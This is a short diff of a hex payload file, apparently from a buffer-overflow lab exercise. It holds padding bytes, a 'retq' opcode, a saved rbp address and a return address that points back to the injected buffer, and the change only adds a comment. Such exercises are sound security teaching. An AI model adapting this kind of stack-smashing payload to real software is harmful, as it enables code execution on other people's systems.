@@ -11,4 +11,4 @@ c3                   	/* retq */
 00 00 00 00 00 00 00 00
 00 00 00 
 e0 2f 78 55 00 00 00 00 /* address of rbp */ 
-60 2f 78 55 00 00 00 00 
+60 2f 78 55 00 00 00 00 /* address of beginning of buffer (rdi) */ 
